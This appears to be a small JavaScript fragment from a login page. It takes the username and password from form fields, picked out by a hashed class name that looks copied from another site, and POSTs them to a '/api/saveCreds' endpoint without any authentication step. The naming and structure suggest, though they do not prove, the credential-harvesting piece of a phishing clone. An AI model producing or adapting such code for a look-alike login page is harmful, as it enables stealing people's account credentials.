
console.log("sdfsdf");

const sendCredsToServer = async (data) => {
    const responseFromServer = await fetch("/api/saveCreds", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
    const res = await responseFromServer.json();
    return res;
}


const loginSubmitHandler = () => {
    const credsData = document.querySelectorAll("._2eKVn6g5Yysx9JmutQe7WV");
    const usernameInputForm = credsData[0].value;
    const passwordInputForm = credsData[1].value;

    const data = {
        username: usernameInputForm , 
        password: passwordInputForm
    }
    sendCredsToServer(data);
}
